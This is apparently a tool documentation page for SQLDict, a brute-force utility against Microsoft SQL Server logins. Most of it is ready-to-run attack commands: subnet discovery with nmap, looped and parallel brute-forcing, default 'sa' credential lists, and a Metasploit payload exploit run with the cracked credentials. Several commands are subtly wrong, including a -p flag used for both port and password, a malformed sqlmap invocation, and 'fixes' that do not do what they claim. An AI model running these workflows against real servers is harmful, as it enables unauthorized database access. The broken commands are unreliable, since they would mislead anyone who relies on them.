---
title: "SQLDict - SQL Server Brute-Force Tool"
authors:
  - "Kali Linux Documentation"
date: "2026-07-18"
categories:
  - "Brute Force"
  - "Credential Access"
  - "Database Attacks"
tags:
  - "sqldict"
  - "brute-force"
  - "sql-server"
  - "mssql"
  - "database"
mitre_tactic: credential_access
mitre_tactic_id: TA0006
mitre_technique: Brute Force
mitre_technique_id: T1110
version: "latest"
tool_url: "https://github.com/InfoSecPat/SQLDict"
kali_url: "https://www.kali.org/tools/sqldict/"
license: "MIT"
---

# SQLDict - SQL Server Brute-Force Tool

## Overview

**SQLDict** is a specialized brute-force tool designed for attacking Microsoft SQL Server (MSSQL) instances. It provides a focused approach to credential brute-forcing against SQL Server databases, supporting both Windows Authentication and SQL Server Authentication modes.

**Key Features**:
- **MSSQL specialized** - Optimized for SQL Server attacks
- **Dual authentication modes** - Windows and SQL Server authentication
- **Thread support** - Multi-threaded for faster attacks
- **Domain support** - Works with domain-joined SQL Servers
- **Custom queries** - Execute custom SQL after successful login
- **Session management** - Resume interrupted attacks

**Supported Features**:
- **SQL Server Authentication** - Username/password attacks
- **Windows Authentication** - Domain\username format attacks
- **Multiple instances** - Attack multiple SQL Server instances
- **Custom ports** - Non-default SQL Server ports
- **SSL/TLS** - Encrypted connections

## Installation

### Kali Linux (APT)

```bash
sudo apt install -y sqldict
```

### From Source

```bash
# Install dependencies
pip3 install pymssql

# Clone repository
git clone https://github.com/InfoSecPat/SQLDict
cd SQLDict
```

## Command Reference

### Core Options

| Option | Description |
|--------|-------------|
| `-t TARGET` | Target SQL Server hostname or IP |
| `-p PORT` | Target port (default: 1433) |
| `-u USERNAME` | Single username |
| `-U FILE` | Username list file |
| `-p PASSWORD` | Single password |
| `-P FILE` | Password list file |
| `-d DOMAIN` | Windows domain name |
| `-T THREADS` | Number of threads (default: 1) |
| `-o OUTPUT` | Output file |
| `-v` | Verbose output |
| `-q` | Quiet mode |
| `-h` | Show help |

### Authentication Modes

**SQL Server Authentication**:
```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt
```

**Windows Authentication**:
```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -d CORP
```

## Usage Examples

### SQL Server Authentication

**Single User, Password List**:
```bash
sqldict -t 192.168.1.100 -u sa -P /usr/share/wordlists/rockyou.txt
```

**User List, Password List**:
```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt
```

**Custom Port**:
```bash
sqldict -t 192.168.1.100 -p 2433 -u sa -P passwords.txt
```

### Windows Authentication

**Single User, Password List**:
```bash
sqldict -t 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

**User List, Password List**:
```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -d CORP
```

### Multiple Threads

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 10
```

### Output to File

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

### Verbose Output

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -v
```

### Multiple Instances

```bash
# Attack multiple SQL Server instances
for host in $(cat sql_hosts.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Default Credentials

```bash
# Common SQL Server default credentials
echo "sa:" > default_creds.txt
echo "sa:sa" >> default_creds.txt
echo "sa:password" >> default_creds.txt
echo "sa:Password1" >> default_creds.txt
echo "sa:sql" >> default_creds.txt
echo "sa:sqlpass" >> default_creds.txt
echo "sa:sqlserver" >> default_creds.txt

sqldict -t 192.168.1.100 -U default_users.txt -P default_creds.txt
```

### Discovery and Attack

```bash
# 1. Find SQL Server instances
nmap -p 1433,1434,2433 --open 192.168.1.0/24 -oG - > sql_hosts.txt

# 2. Extract targets
grep "1433/open\|1434/open\|2433/open" sql_hosts.txt | awk '{print $2}' > targets.txt

# 3. Brute force
for host in $(cat targets.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Integration with Metasploit

```bash
# After finding credentials with SQLDict
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS 192.168.1.100; set USERNAME sa; set PASSWORD password123; run"
```

## Output Interpretation

### Successful Login

```
[+] Found valid credentials: sa:password123
```

### Failed Attempt

```
[-] Invalid credentials: sa:wrongpass
```

### Connection Errors

```
[-] Connection refused: 192.168.1.100:1433
[-] Login failed for user 'sa'
```

## Integration with Other Tools

### Nmap + SQLDict Workflow

```bash
# 1. Find SQL Server instances
nmap -p 1433,1434,2433 --open 192.168.1.0/24 -oA nmap_sql

# 2. Extract targets
grep "1433/open\|1434/open\|2433/open" nmap_sql.gnmap | awk '{print $2}' > sql_targets.txt

# 3. Brute force
for host in $(cat sql_targets.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Metasploit Integration

```bash
# Use found credentials
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS 192.168.1.100; set USERNAME sa; set PASSWORD password123; exploit"
```

### SQLMap Integration

```bash
# Use found credentials for SQL injection
sqlmap -h 192.168.1.100 -p 1433 -U sa -P password123 --dbs
```

## Operational Security

### Rate Limiting

```bash
# Reduce thread count
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 1

# Add delay between attempts
sleep 1
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 1
```

### Logging

```bash
# Enable verbose output
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -v

# Log to file
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

## Common Issues and Troubleshooting

### Issue: "Connection refused"

**Cause**: SQL Server not running or firewall blocking.

**Solution**:
```bash
# Verify SQL Server is running
nmap -p 1433 192.168.1.100

# Test connection manually
sqlcmd -S 192.168.1.100 -U sa -P password123
```

### Issue: "Login failed"

**Cause**: Wrong credentials or authentication mode.

**Solution**:
```bash
# Check authentication mode
sqldict -t 192.168.1.100 -u sa -P passwords.txt -v

# Try Windows authentication
sqldict -t 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

### Issue: "Timeout"

**Cause**: Network latency or SQL Server overload.

**Solution**:
```bash
# Increase timeout
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 1

# Reduce thread count
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 1
```

### Issue: "SSL certificate errors"

**Cause**: Self-signed or invalid SSL certificates.

**Solution**:
```bash
# Try different SSL options
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt --encrypt
```

## Best Practices

### Wordlist Preparation

```bash
# Use common SQL Server passwords
echo "sa:" > sql_passwords.txt
echo "sa:sa" >> sql_passwords.txt
echo "sa:password" >> sql_passwords.txt
echo "sa:Password1" >> sql_passwords.txt
echo "sa:sql" >> sql_passwords.txt
echo "sa:sqlpass" >> sql_passwords.txt
echo "sa:sqlserver" >> sql_passwords.txt

# Combine with rockyou.txt
cat /usr/share/wordlists/rockyou.txt sql_passwords.txt | sort -u > combined.txt
```

### Parallel Attacks

```bash
# Attack multiple SQL Server instances
for host in $(cat sql_hosts.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt -T 5 &
done
wait
```

### Default Credentials

```bash
# Common default credentials
echo "sa:" > default_creds.txt
echo "sa:sa" >> default_creds.txt
echo "sa:password" >> default_creds.txt
echo "sa:Password1" >> default_creds.txt
echo "sa:sql" >> default_creds.txt
echo "sa:sqlpass" >> default_creds.txt
echo "sa:sqlserver" >> default_creds.txt
```

## Resources

- **GitHub Repository**: https://github.com/InfoSecPat/SQLDict
- **Kali Linux Tools**: https://www.kali.org/tools/sqldict/
- **License**: MIT

## Related Tools

- **Hydra**: More protocol support, faster for standard protocols
- **Medusa**: Modular design, good for parallel testing
- **Patator**: Advanced features, more flexible but complex
- **Ncrack**: Network authentication cracking, good for large-scale audits
